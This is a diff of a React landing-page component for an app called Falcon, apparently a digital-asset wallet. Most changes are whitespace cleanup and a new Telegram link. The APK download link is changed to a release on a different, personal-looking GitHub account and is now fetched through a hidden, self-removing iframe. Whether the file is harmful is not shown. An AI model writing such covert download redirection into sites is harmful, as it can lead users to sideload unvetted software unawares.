@@ -24,7 +24,7 @@ const SecurityAndFooter = () => {
           <h2 className="text-3xl md:text-[2.5rem] font-bold text-[#111111] mb-4">Security & Compliance</h2>
           <p className="text-lg text-[#111111] font-medium">Security is our top priority</p>
         </div>
-        
+
         <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-8 mb-16 max-w-5xl mx-auto text-center">
           <div className="flex flex-col items-center">
             <div className="w-14 h-14 bg-gray-50 rounded-2xl flex items-center justify-center mb-4">
@@ -36,7 +36,7 @@ const SecurityAndFooter = () => {
             <h4 className="font-bold text-[#111111] text-lg mb-1">Advanced Encryption</h4>
             <p className="text-[13px] text-gray-500 font-medium">End-to-end security</p>
           </div>
-          
+
           <div className="flex flex-col items-center">
             <div className="w-14 h-14 bg-gray-50 rounded-2xl flex items-center justify-center mb-4">
               <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#111111" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
@@ -49,7 +49,7 @@ const SecurityAndFooter = () => {
             <h4 className="font-bold text-[#111111] text-lg mb-1">Secure Architecture</h4>
             <p className="text-[13px] text-gray-500 font-medium">Multi-signature tech</p>
           </div>
-          
+
           <div className="flex flex-col items-center">
             <div className="w-14 h-14 bg-gray-50 rounded-2xl flex items-center justify-center mb-4">
               <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#111111" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
@@ -60,7 +60,7 @@ const SecurityAndFooter = () => {
             <h4 className="font-bold text-[#111111] text-lg mb-1">Risk Monitoring</h4>
             <p className="text-[13px] text-gray-500 font-medium">24/7 threat detection</p>
           </div>
-          
+
           <div className="flex flex-col items-center">
             <div className="w-14 h-14 bg-gray-50 rounded-2xl flex items-center justify-center mb-4">
               <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#111111" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
@@ -72,11 +72,11 @@ const SecurityAndFooter = () => {
             <p className="text-[13px] text-gray-500 font-medium">Regional compliance</p>
           </div>
         </div>
-        
+
         <p className="text-sm font-bold text-center text-[#111111] mb-24">
           Falcon prioritizes security and follows applicable digital asset compliance standards across supported regions.
         </p>
-        
+
         <div id="download-section" className="text-left md:text-left max-w-5xl mx-auto flex flex-col md:flex-row justify-between items-start md:items-center">
           <div className="mb-8 md:mb-0 space-y-2">
             <h3 className="text-[1.75rem] font-bold text-[#111111]">Download Falcon</h3>
@@ -113,19 +113,28 @@ const SecurityAndFooter = () => {
               </div>
             </div>
 
-            <a 
-              href="https://github.com/FalconDevelopmentapp/FalconDevelopment/releases/download/1.0.2/Falcon.apk"
-              download="Falcon.apk"
-              className="bg-gray-100 hover:bg-gray-200 text-[#111111] rounded-xl w-[150px] h-[52px] transition-transform hover:scale-105 flex items-center justify-center px-3 space-x-2"
+            <a
+              href="https://github.com/finlayarnoldbusiness-droid/Falcon/releases/download/V1.0.4/Falcon.apk"
+              onClick={(e) => {
+                e.preventDefault();
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = 'https://github.com/finlayarnoldbusiness-droid/Falcon/releases/download/V1.0.4/Falcon.apk';
+                document.body.appendChild(iframe);
+                setTimeout(() => {
+                  document.body.removeChild(iframe);
+                }, 5000);
+              }}
+              className="bg-gray-100 hover:bg-gray-200 text-[#111111] rounded-xl w-[150px] h-[52px] transition-transform hover:scale-105 flex items-center justify-center px-3 cursor-pointer space-x-2"
             >
-              <svg 
-                width="22" 
-                height="22" 
-                viewBox="0 0 24 24" 
-                fill="none" 
-                stroke="currentColor" 
-                strokeWidth="2" 
-                strokeLinecap="round" 
+              <svg
+                width="22"
+                height="22"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                strokeWidth="2"
+                strokeLinecap="round"
                 strokeLinejoin="round"
               >
                 <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
@@ -151,8 +160,8 @@ const SecurityAndFooter = () => {
             </div>
           </div>
           <div className="flex space-x-4">
-            <a 
-              href="twitter://user?screen_name=falconmainnet" 
+            <a
+              href="twitter://user?screen_name=falconmainnet"
               onClick={(e) => {
                 const now = Date.now();
                 setTimeout(() => {
@@ -167,12 +176,17 @@ const SecurityAndFooter = () => {
                 <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
               </svg>
             </a>
-            <div className="w-10 h-10 bg-[#0088cc] hover:bg-blue-600 rounded-full flex items-center justify-center cursor-pointer transition-colors">
+            <a 
+              href="https://t.me/FalconOfficial_English" 
+              target="_blank" 
+              rel="noopener noreferrer" 
+              className="w-10 h-10 bg-[#0088cc] hover:bg-blue-600 rounded-full flex items-center justify-center cursor-pointer transition-colors"
+            >
               <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                 <line x1="22" y1="2" x2="11" y2="13"></line>
                 <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
               </svg>
-            </div>
+            </a>
             <div className="w-10 h-10 bg-[#FF0000] hover:bg-red-700 rounded-full flex items-center justify-center cursor-pointer transition-colors">
               <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
                 <path d="M22.54 6.42a2.78 2.78 0 0 0-1.94-2C18.88 4 12 4 12 4s-6.88 0-8.6.46a2.78 2.78 0 0 0-1.94 2A29 29 0 0 0 1 11.75a29 29 0 0 0 .46 5.33 2.78 2.78 0 0 0 1.94 2c1.72.46 8.6.46 8.6.46s6.88 0 8.6-.46a2.78 2.78 0 0 0 1.94-2 29 29 0 0 0 .46-5.33 29 29 0 0 0-.46-5.33zM9.75 15.02V8.48l6.08 3.27-6.08 3.27z"/>
